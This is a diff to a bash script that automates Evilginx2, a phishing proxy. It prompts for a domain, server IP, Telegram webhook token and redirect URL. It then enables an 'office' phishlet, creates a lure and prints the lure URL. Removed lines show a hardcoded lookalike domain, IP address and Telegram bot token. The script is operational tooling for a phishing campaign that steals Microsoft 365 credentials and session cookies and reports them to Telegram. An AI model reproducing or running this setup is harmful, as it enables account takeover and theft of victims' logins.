@@ -8,6 +8,12 @@ log_message() {
     echo "[$(date)] $1" | tee -a "$LOG_FILE"
 }
 
+# Prompt for user input
+read -p "Enter domain name (e.g., example.com): " DOMAIN
+read -p "Enter external IPv4 address: " EXTERNAL_IPV4
+read -p "Enter redirect URL (e.g., https://nba.com): " REDIRECT_URL
+read -p "Enter Telegram Webhook Token: " TELEGRAM_WEBHOOK
+
 # Ensure `expect` is installed
 log_message "[+] Checking if required packages are installed..."
 if ! command -v expect &> /dev/null; then
@@ -52,9 +58,9 @@ if [ -f "$CONFIG_FILE" ]; then
         log_message "[+] Changed dns_port to 5300"
     fi
 
-    # Modify domain and external IPv4
-    sed -i 's|domain: ""|domain: "jramaleyinc.com"|' "$CONFIG_FILE"
-    sed -i 's|external_ipv4: ""|external_ipv4: "3.93.188.252"|' "$CONFIG_FILE"
+    # Modify domain and external IPv4 dynamically based on user input
+    sed -i "s|domain: .*|domain: \"$DOMAIN\"|" "$CONFIG_FILE"
+    sed -i "s|external_ipv4: .*|external_ipv4: \"$EXTERNAL_IPV4\"|" "$CONFIG_FILE"
 
     # Remove the `unauth_url` field entirely
     sed -i '/unauth_url:/d' "$CONFIG_FILE"
@@ -62,9 +68,9 @@ if [ -f "$CONFIG_FILE" ]; then
 
     # Ensure webhook_telegram is correctly formatted under `general:`
     if grep -q "webhook_telegram:" "$CONFIG_FILE"; then
-        sed -i 's|webhook_telegram: .*|webhook_telegram: "8061346191:AAFasw6OLfRRPEI7otM1uE7yjd-yY1zznIY/1542058668"|' "$CONFIG_FILE"
+        sed -i "s|webhook_telegram: .*|webhook_telegram: \"$TELEGRAM_WEBHOOK\"|" "$CONFIG_FILE"
     else
-        sed -i '/general:/a \ \ webhook_telegram: "8061346191:AAFasw6OLfRRPEI7otM1uE7yjd-yY1zznIY/1542058668"' "$CONFIG_FILE"
+        sed -i "/general:/a \ \ webhook_telegram: \"$TELEGRAM_WEBHOOK\"" "$CONFIG_FILE"
     fi
     log_message "[+] Updated webhook_telegram in config.yaml"
 
@@ -86,13 +92,13 @@ log_message "[+] Restarting Evilginx and executing commands..."
 expect <<EOF | tee -a "$LOG_FILE"
     spawn ./evilginx2
     expect "evilginx2 >"
-    send "phishlets hostname office jramaleyinc.com\r"
+    send "phishlets hostname office $DOMAIN\r"
     expect "evilginx2 >"
     send "phishlets enable office\r"
     expect "evilginx2 >"
     send "lures create office\r"
     expect "evilginx2 >"
-    send "lures edit 0 redirect_url https://nba.com\r"
+    send "lures edit 0 redirect_url $REDIRECT_URL\r"
     expect "evilginx2 >"
     send "lures get-url 0\r"
     expect "evilginx2 >"
